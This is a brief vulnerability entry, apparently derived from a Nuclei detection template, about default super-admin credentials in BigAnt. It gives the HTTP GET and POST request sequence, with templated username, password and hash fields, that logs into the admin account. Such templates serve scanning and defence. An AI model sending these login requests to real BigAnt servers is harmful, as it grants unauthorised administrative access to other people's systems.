# Vulnerability: BigAnt - Default Password
**Classification:** CWE-522
**Source:** Nuclei Template (`bigant-default-login.yaml`)

## Description
Misconfiguratoin leads to Default Login into BigAnt Super Admin Account.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /index.php/Home/login/index.html HTTP/1.1
Host: {{Hostname}}

POST /index.php/Home/Login/login_post.html HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

saas=default&account={{username}}&password={{base64(password)}}&to=admin&app=&__hash__={{hash}}&__hash__={{hash}}&submit=
```

